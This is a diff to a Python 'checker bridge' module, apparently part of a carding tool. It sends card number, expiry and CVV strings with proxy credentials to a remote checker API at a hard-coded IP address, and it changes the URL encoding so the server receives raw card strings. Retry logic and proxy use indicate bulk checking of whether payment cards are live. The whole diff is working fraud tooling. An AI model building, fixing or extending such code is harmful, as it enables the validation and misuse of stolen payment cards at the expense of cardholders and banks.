@@ -7,7 +7,8 @@ import aiohttp
 import json
 import time
 import logging
-from urllib.parse import quote as _urlquote, unquote as _urlunquote
+from urllib.parse import unquote as _urlunquote
+from yarl import URL
 
 log = logging.getLogger("checker_bridge")
 log.setLevel(logging.DEBUG)
@@ -16,14 +17,8 @@ log.setLevel(logging.DEBUG)
 #  CONFIG
 # ══════════════════════════════════════════════════════════════════════════════
 
-# New single checker endpoint
 API_BASE = "http://5.175.222.144:8081"
-
-# Total attempts (first try + retries). 5 = up to 5 total attempts.
-# Bad response / dead / error / timeout sab pe retry karega.
 MAX_RETRIES = 5
-
-# Timeout per individual attempt (seconds)
 REQUEST_TIMEOUT = 120
 _CONNECT_TIMEOUT = 5
 
@@ -180,9 +175,11 @@ async def _call_api(cc_str: str, proxy_str: str) -> dict:
     sess = await _get_session()
 
     # Exact format: http://5.175.222.144:8081/?cc|mm|yy|cvv&proxy=host:port:user:pass
-    cc_quoted    = _urlquote(cc_str, safe="|")
-    proxy_quoted = _urlquote(proxy_str, safe=":")
-    url = f"{API_BASE}/?{cc_quoted}&proxy={proxy_quoted}"
+    # IMPORTANT: server expects literal '|' in query string.
+    # aiohttp/yarl encodes '|' → '%7C' by default which breaks the API.
+    # We use yarl.URL(encoded=True) to preserve raw characters.
+    url_str = f"{API_BASE}/?{cc_str}&proxy={proxy_str}"
+    url = URL(url_str, encoded=True)
 
     cc4 = cc_str.split('|')[0][-4:] if '|' in cc_str else cc_str[-4:]
     log.debug(f"[api] → {API_BASE} | cc=...{cc4} | proxy={proxy_str[:35]}...")
